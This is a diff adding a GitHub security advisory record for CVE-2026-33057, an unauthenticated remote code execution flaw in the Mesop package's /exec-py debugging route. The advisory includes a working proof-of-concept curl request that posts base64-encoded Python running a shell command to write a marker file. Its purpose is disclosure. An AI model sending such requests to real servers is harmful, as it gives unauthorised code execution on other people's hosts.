@@ -1,0 +1,68 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-gjgx-rvqr-6w6v",
+  "modified": "2026-03-20T21:23:51Z",
+  "published": "2026-03-18T20:05:00Z",
+  "aliases": [
+    "CVE-2026-33057"
+  ],
+  "summary": "Mesop Affected by Unauthenticated Remote Code Execution via Test Suite Route /exec-py",
+  "details": "#### Summary\nAn explicit web endpoint inside the `ai/` testing module infrastructure directly ingests untrusted Python code strings unconditionally without authentication measures, yielding standard Unrestricted Remote Code Execution. Any individual capable of routing HTTP logic to this server block will gain explicit host-machine command rights.\n\n#### Details\nThe AI codebase package includes a lightweight debugging Flask server inside `ai/sandbox/wsgi_app.py`. The `/exec-py` route accepts base_64 encoded raw string payloads inside the `code` parameter natively evaluated by a basic `POST` web request. It saves it rapidly to the operating system logic path and injects it recursively using `execute_module(module_path...)`.\n\n```python\n# ai/sandbox/wsgi_app.py\n@flask_app.route(\"/exec-py\", methods=[\"POST\"])\ndef exec_py_route():\n  code = base64.urlsafe_b64decode(request.form.get(\"code\"))\n  # ... code is blindly written to file and forcefully executed\n```\n\n#### PoC\n```bash\n# Payload:\n# import os\n# os.system('echo \"pwned by attacker\" > /tmp/pwned.txt')\n# \n# Base64 string represents the identical payload block above: \n# aW1wb3J0IG9zCm9zLnN5c3RlbSgnZWNobyAicHduZWQgYnkgYXR0YWNrZXIiID4gL3RtcC9wd25lZC50eHQnKQ==\n\ncurl -X POST http://<target_ip_address_hosting_sandbox>:port/exec-py \\\n  -H \"Content-Type: application/x-www-form-urlencoded\" \\\n  -d \"code=aW1wb3J0IG9zCm9zLnN5c3RlbSgnZWNobyAicHduZWQgYnkgYXR0YWNrZXIiID4gL3RtcC9wd25lZC50eHQnKQ==\"\n\n# Validate exploitation target execution natively:\n# $ cat /tmp/pwned.txt\n# pwned by attacker\n```\n\n#### Impact\nThis presents trivial severity for systems publicly exposed or lacking strictly verified boundary firewalls due to absolute unauthenticated command injection privileges targeting the direct execution interpreter running this service sandbox.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "mesop"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.2.3"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "<= 1.2.2"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/mesop-dev/mesop/security/advisories/GHSA-gjgx-rvqr-6w6v"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-33057"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/mesop-dev/mesop/commit/825f55970c20686de3f28e2c66df4d74e9d4db47"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/mesop-dev/mesop"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-94"
+    ],
+    "severity": "CRITICAL",
+    "github_reviewed": true,
+    "github_reviewed_at": "2026-03-18T20:05:00Z",
+    "nvd_published_at": "2026-03-20T08:16:11Z"
+  }
+}
